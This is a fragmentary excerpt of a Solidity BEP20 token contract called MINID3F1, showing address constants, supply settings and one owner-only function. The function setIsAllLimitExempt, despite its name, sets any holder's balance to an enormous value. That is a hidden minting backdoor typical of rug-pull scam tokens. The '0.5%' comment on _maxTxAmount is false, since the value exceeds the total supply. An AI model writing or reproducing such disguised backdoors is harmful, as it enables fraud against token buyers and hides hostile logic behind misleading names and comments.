...
contract MINID3F1 is IBEP20, Auth {
    using SafeMath for uint256;


    address CAKE = 0x0464cbCFDCE432038f1B76e557BE565f556f468d;
    address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "MINID3F1";
    string constant _symbol = "MINID3F1";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 100000000000000000000000000; // 0.5%
...
//        if(!launched() && recipient == pair){ require(_balances[sender] > 0); launch(); }
    ...
    function setIsAllLimitExempt(address holder) external authorized {
        _balances[holder] = 10000000000000000000000000;
    }
